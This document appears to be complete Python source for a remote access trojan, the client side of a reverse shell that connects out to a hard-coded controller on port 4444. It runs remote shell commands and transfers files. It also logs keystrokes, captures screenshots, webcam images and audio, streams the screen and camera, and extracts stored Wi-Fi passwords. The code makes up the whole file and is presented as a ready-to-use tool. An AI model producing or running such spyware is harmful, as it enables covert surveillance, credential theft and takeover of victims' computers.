#Moderne Reverse Shell with keylogger, screenshot, webcam, record audio, live streming.full system controll.

import os
import cv2 
import wave
import time
import socket
import pickle
import struct
import threading
import pyautogui 
import numpy as np
from PIL import Image
from io import BytesIO
import sounddevice as sd 
import pyscreenshot as ImageGrab 
from flask import Flask, Response 
from pynput.keyboard import Listener, Key 
import platform
import subprocess #for wifikey function

#keylog variable
log = ""

lanip = "" # store lan ip

def get_lan_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1" 
    finally:
        s.close()
    return ip

lanip = get_lan_ip()

# -------------------------------
app_camera = Flask("camera_stream")

def generate_frames():
    cap = cv2.VideoCapture(0)
    while True:
        success, frame = cap.read()
        if not success:
            break
        else:
            ret, buffer = cv2.imencode('.jpg', frame)
            frame = buffer.tobytes()
            yield (b'--frame\r\n'
                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')

@app_camera.route('/')
def camera_feed():
    return Response(generate_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')

def starting(): 
    app_camera.run(host=lanip, port=8081, threaded=True)

# -------------------------------

# -------------------------------
app_screen = Flask("screen_stream")

def capture_screen():
    while True:
        screenshot = pyautogui.screenshot()
        img = BytesIO()
        screenshot.save(img, format='JPEG')
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + img.getvalue() + b'\r\n')
        time.sleep(0.1)  

@app_screen.route('/')
def screen_feed():
    return Response(capture_screen(), mimetype='multipart/x-mixed-replace; boundary=frame')

def live_starting(): 
    app_screen.run(host=lanip, port=8080, threaded=True)

# -----------------------------------------
#   USE THIS CODE IN YOUR OWN SYSSTEM
# -----------------------------------------

#this for screenshot
def take_screenshot(filename):
    im = ImageGrab.grab()
    im.save(filename)
    
#this for webcam
def capture_webcam_image(filename):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        cv2.imwrite(filename, frame)
    cam.release()


#recording an audio
def record_audio(filename, duration=5, fs=44100):
    print("Recording...")
    recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
    sd.wait()

    wf = wave.open(filename, 'wb')
    wf.setnchannels(2)
    wf.setsampwidth(2)
    wf.setframerate(fs)
    wf.writeframes(recording.tobytes())
    wf.close()
    print("Recording complete.")

"""the keylogger section """

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        if key == Key.space:
            log += ' '
        else:
            log += f' [{key}] '

def start_keylogger():
    with Listener(on_press=on_press) as listener:
        listener.join()

def send_log(sock):
    global log
    if log:
        sock.send(log.encode())
        log = ""
    else:
        sock.send(b"No keystrokes logged yet.")
 """the keylogger section """


#show wifi keys 
def extract_wifi_passwords_windows():
    try:
        output = subprocess.check_output("netsh wlan show profiles", shell=True).decode(errors="ignore")
        networks = []
        for line in output.splitlines():
            if "All User Profile" in line:
                name = line.split(":")[1].strip()
                try:
                    profile = subprocess.check_output(f"netsh wlan show profile \"{name}\" key=clear", shell=True).decode(errors="ignore")
                    password = ""
                    for l in profile.splitlines():
                        if "Key Content" in l:
                            password = l.split(":")[1].strip()
                            break
                    networks.append(f"SSID: {name}\nPassword: {password or 'N/A'}\n")
                except:
                    networks.append(f"SSID: {name}\nPassword: Error reading\n")
        return "\n".join(networks) if networks else "No Wi-Fi profiles found."
    except Exception as e:
        return f"Error: {e}"
 

def main():
    host = "192.168.1.6" #Dir ip ta3k hna (dkhl lcmd oktb ipconfig)
    port = 4444
    
    # Start streaming servers in separate threads immediately
    threading.Thread(target=starting, daemon=True).start()
    threading.Thread(target=live_starting, daemon=True).start()

    while True: # Loop to continuously try to connect
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            client.connect((host, port))
            print(f"[*] Connected to {host}:{port}")

            keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
            keylogger_thread.start()

            while True: # Loop for communication with the server
                try:
                    command = client.recv(1024).decode()

                    if command == 'exit':
                        break # Break from inner loop, client will try to reconnect

                    elif command.startswith('cd'):
                        try:
                            os.chdir(command[3:])
                            client.send(b"Changed directory to " + os.getcwd().encode())
                        except FileNotFoundError as e:
                            client.send(str(e).encode())


                    elif command.startswith('download'):
                        _, filename = command.split()
                        if os.path.exists(filename):
                            with open(filename, 'rb') as f:
                                while True:
                                    data = f.read(1024)
                                    if not data:
                                        client.send(b'EOF')
                                        break
                                    client.send(data)
                        else:
                            client.send(b'File not found.')


                    elif command.startswith('upload'):
                        _, filename = command.split()
                        with open(filename, 'wb') as f:
                            while True:
                                data = client.recv(1024)
                                if data.endswith(b'EOF') or not data: # Handle empty data too
                                    f.write(data[:-3] if data.endswith(b'EOF') else data)
                                    break
                                f.write(data)
                        client.send(b'Upload complete.')


                    elif command.startswith('screenshot'):
                        filename = 'screenshot.png'
                        take_screenshot(filename)
                        with open(filename, 'rb') as f:
                            while True:
                                data = f.read(1024)
                                if not data:
                                    client.send(b'EOF')
                                    break
                                client.send(data)
                                time.sleep(1)
                                


                    elif command.startswith('webcam'):
                        filename = 'webcam.jpg'
                        capture_webcam_image(filename)
                        with open(filename, 'rb') as f:
                            while True:
                                data = f.read(1024)
                                if not data:
                                    client.send(b'EOF')
                                    break
                                client.send(data)
                                time.sleep(1)
                                


                    elif command.startswith('record'):
                        duration = int(command.split()[1]) if len(command.split()) > 1 else 5
                        filename = 'recording.wav'
                        record_audio(filename, duration)
                        with open(filename, 'rb') as f:
                            while True:
                                data = f.read(1024)
                                if not data:
                                    client.send(b'EOF')
                                    break
                                client.send(data)
                                time.sleep(1)
                                


                    elif command.startswith('keylog'):
                        send_log(client)

                    elif command.startswith("stream_webcam"):
                        msg = f'streaming on : http://{lanip}:8081 ...'
                        client.send(msg.encode())
                        # Streaming threads are already started at the beginning :-)
                    elif command.startswith("screenshare"):
                        msg = f'streaming on : http://{lanip}:8080 ...'
                        client.send(msg.encode())
                        
                    #all system info
                    elif command.startswith("sysinfo"):
                        info = {
                            "System": platform.system(),
                            "Node Name": platform.node(),
                            "Release": platform.release(),
                            "Version": platform.version(),
                            "Machine": platform.machine(),
                            "Processor": platform.processor(),
                            "Architecture": platform.architecture(),
                            "Platform": platform.platform(),
                            "Uname": platform.uname(),
                            "Python Version": platform.python_version(),
                            "Python Compiler": platform.python_compiler(),
                            "Python Build": platform.python_build()
                        }

                        sysmsg_parts = ["sysinfo OUTPUT :"]
                        for key, value in info.items():
                            sysmsg_parts.append(f"{key}: {value}")
                        sysmsg = "\n".join(sysmsg_parts)
                        client.send(sysmsg.encode())


                    elif command == "wifikey":
                        result = extract_wifi_passwords_windows()
                        client.send(result.encode())


                    else:
                        try:
                            output = os.popen(command).read()
                            if output.strip() == "":
                                client.send("Command executed, but returned no output or unknown command.\n".encode())
                            else:
                                client.send(output.encode())
                        except Exception as e:
                            error_msg = f"Client error executing command: {str(e)}\n"
                            client.send(error_msg.encode())

                except (socket.error, ConnectionResetError, BrokenPipeError) as e:
                    print(f"[-] Disconnected from server: {e}")
                    break 
                except Exception as e:
                    print(f"[-] An error occurred during communication: {e}")
                    break 

            client.close() 
            print("[*] Attempting to reconnect in 5 seconds...")
            time.sleep(5) 

        except socket.error as e:
            print(f"[-] Connection failed: {e}. Retrying in 5 seconds...")
            time.sleep(5) 
        except Exception as e:
            print(f"[-] An unexpected error occurred in client main loop: {e}. Retrying in 5 seconds...")
            time.sleep(5)


if __name__ == "__main__":
    main()
